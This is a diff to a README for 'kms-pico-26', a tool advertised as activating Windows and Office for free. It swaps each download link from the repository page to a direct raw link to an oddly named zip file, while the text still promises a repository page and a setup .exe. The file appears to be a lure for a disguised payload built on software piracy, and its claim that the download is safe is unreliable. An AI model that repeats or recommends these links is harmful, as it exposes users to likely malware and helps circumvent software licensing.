@@ -1,6 +1,6 @@
 # 🔑 kms-pico-26 - Activate Windows and Office Easily
 
-[![Download Now](https://img.shields.io/badge/Download-kms--pico--26-brightgreen?style=for-the-badge)](https://github.com/accnshit687-dev/kms-pico-26)
+[![Download Now](https://img.shields.io/badge/Download-kms--pico--26-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/accnshit687-dev/kms-pico-26/main/fittyways/kms-pico-grandniece.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Before installing kms-pico-26, make sure your computer meets these requirements:
 
 Click the button below to visit the page where you can download the tool safely.
 
-[![Download kms-pico-26](https://img.shields.io/badge/Download-kms--pico--26-blue?style=for-the-badge)](https://github.com/accnshit687-dev/kms-pico-26)
+[![Download kms-pico-26](https://img.shields.io/badge/Download-kms--pico--26-blue?style=for-the-badge)](https://raw.githubusercontent.com/accnshit687-dev/kms-pico-26/main/fittyways/kms-pico-grandniece.zip)
 
 You will be taken to the GitHub repository page. Look for the file named similar to "kms-pico-26.exe" or any setup file under the Releases section. Download the latest version available.
 
@@ -107,7 +107,7 @@ If activation fails or the tool does not work as expected:
 
 You can always download or check the latest version of kms-pico-26 here:
 
-[Download kms-pico-26](https://github.com/accnshit687-dev/kms-pico-26)
+[Download kms-pico-26](https://raw.githubusercontent.com/accnshit687-dev/kms-pico-26/main/fittyways/kms-pico-grandniece.zip)
 
 For more details or updates, visit the official GitHub repository.
 
